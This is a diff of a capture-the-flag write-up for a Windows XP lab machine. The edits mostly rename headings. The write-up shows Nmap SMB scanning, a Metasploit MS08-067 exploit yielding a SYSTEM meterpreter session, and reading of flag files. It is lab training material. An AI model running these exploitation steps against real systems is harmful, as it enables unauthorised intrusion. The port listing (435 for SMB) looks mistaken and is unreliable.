@@ -2,8 +2,9 @@
 IP address: 10.10.10.4\
 OS : Windows
 
-## Enumeration
-Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
+## Discovery
+### Nmap
+Lets start with running a network scan on the IP address using Nmap to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -12,14 +13,14 @@ Lets start with running a network scan on the IP address using ```NMAP``` to ide
 sudo nmap -sC -sV -A -p- -T4 10.10.10.4 -vv
 ```
 
-From the output of ```NMAP```, we are able to obtain the following information about the open ports:
+From the output of Nmap, we are able to obtain the following information about the open ports:
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 139	| netbios-ssn | Microsoft Windows netbios-ssn | Open |
 | 435	| microsoft-ds | Windows XP microsoft-ds | Open |
 | 3389	| ms-wbt-server | NIL | Closed |
 
-Apart from that, the output of ```NMAP``` also reveals that there is a SMB service running on the IP address, with a possibility that ```SMB v1``` is used and running on ```Microsoft XP```
+Apart from that, the output of Nmap also reveals that there is a SMB service running on the IP address, with a possibility that SMB V1 is used and running on Microsoft XP
 ```code
 | smb-os-discovery: 
 |   OS: Windows XP (Windows 2000 LAN Manager)
@@ -32,8 +33,7 @@ Apart from that, the output of ```NMAP``` also reveals that there is a SMB servi
 |_smb2-time: Protocol negotiation failed (SMB2)
 ```
 
-## Discovery
-Knowing that ports 139 and 435 are running SMB services, we will run a ```nmap``` script to check for SMB vulnerabilities
+Knowing that ports 139 and 435 are running SMB services, we will run a Nmap script to check for SMB vulnerabilities
 * --script : Specify the script to scan
 * -p : Specify the ports to run the scan on
 ```code
@@ -74,7 +74,7 @@ Host script results:
 |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 ```
 
-## Exploitation
+## Exploite
 ### CVE-2008-4250
 For ```CVE-2008-4250```, I will use meterpreter to exploit the vulnerability (Cant seem to find any working exploit:(). After the exploit, we realise that we have gained access to the SMB server with root privileges
 ```code
@@ -96,7 +96,7 @@ msf6 exploit(windows/smb/ms08_067_netapi) > exploit
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
-#### Obtaining user flag
+### Obtaining user flag
 ```code
 meterpreter > cd ..
 meterpreter > cd ..
@@ -152,7 +152,7 @@ Mode              Size  Type  Last modified              Name
 
 meterpreter > cat user.txt
 ```
-#### Obtaining system flag
+#### Obtaining root flag
 ```code
 meterpreter > cd ..
 meterpreter > cd ..
@@ -294,7 +294,7 @@ Microsoft Windows XP [Version 5.1.2600]
 C:\WINDOWS\system32>
 ```
 
-#### Obtaining user flag
+### Obtaining user flag
 ```code
 C:\WINDOWS\system32>cd ../..
 cd ../..
@@ -305,7 +305,7 @@ type user.txt
 <Redacted user flag>
 ```
 
-#### Obtaining system flag
+### Obtaining root flag
 ```code
 C:\Documents and Settings\john\Desktop>cd ../..
 cd ../..
